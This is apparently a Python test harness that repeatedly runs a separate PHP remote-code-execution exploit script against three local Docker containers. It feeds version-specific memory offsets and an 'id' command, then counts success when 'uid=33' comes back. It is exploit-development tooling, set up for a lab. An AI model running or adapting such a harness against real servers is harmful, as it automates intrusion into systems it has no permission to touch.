import subprocess, sys, time
BASE = r"C:\Users\likat\p2s52704"
# (container, port, zif, dtor)
VERS = [
    ("p2s8335", "18112", "0x3ac080", "0x49ec50"),
    ("p2s8426", "18113", "0x465370", "0x65eb60"),
    ("p2s8511", "18114", "0x5996e0", "0x7b47a0"),
]
MAX_ATTEMPTS = int(sys.argv[1]) if len(sys.argv) > 1 else 20

def sh(cmd):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True)

def one_attempt(c, port, zif, dtor):
    sh(f'docker exec {c} rm -f /www/p1 2>/dev/null')
    sh(f'docker restart {c}')
    time.sleep(3.0)
    cmd = ["python", BASE + r"\exploit.py",
           "-u", f"http://127.0.0.1:{port}/index.php",
           "--profile", "bookworm",
           "--zif-offset", zif, "--dtor-offset", dtor,
           "--retries", "3",
           "-c", "id>/www/p1", "--fetch", "/p1"]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        out = (r.stdout or "") + (r.stderr or "")
    except subprocess.TimeoutExpired:
        out = "TIMEOUT"
    proof_ok = "uid=33" in out
    return proof_ok, out

def main():
    done = []
    for c, port, zif, dtor in VERS:
        print(f"\n########## {c} ({port}) ##########", flush=True)
        landed = False
        for a in range(1, MAX_ATTEMPTS + 1):
            proof_ok, out = one_attempt(c, port, zif, dtor)
            if proof_ok:
                proof = sh(f'docker exec {c} cat /www/p1').stdout.strip()
                print(f"  [attempt {a}] *** RCE PROVEN *** proof: {proof[:60]}", flush=True)
                landed = True
                break
            # which stage did it reach?
            reached = "stage1"
            if "stage 2" in out: reached = "stage2"
            if "stage 3" in out: reached = "stage3"
            print(f"  [attempt {a}] no proof (reached {reached})", flush=True)
            time.sleep(1.0)
        if landed:
            done.append(c)
        else:
            print(f"  !! {c} did not land in {MAX_ATTEMPTS} attempts", flush=True)
    print("\n" + "="*60)
    print(f"LANDED: {', '.join(done)}")

if __name__ == "__main__":
    main()
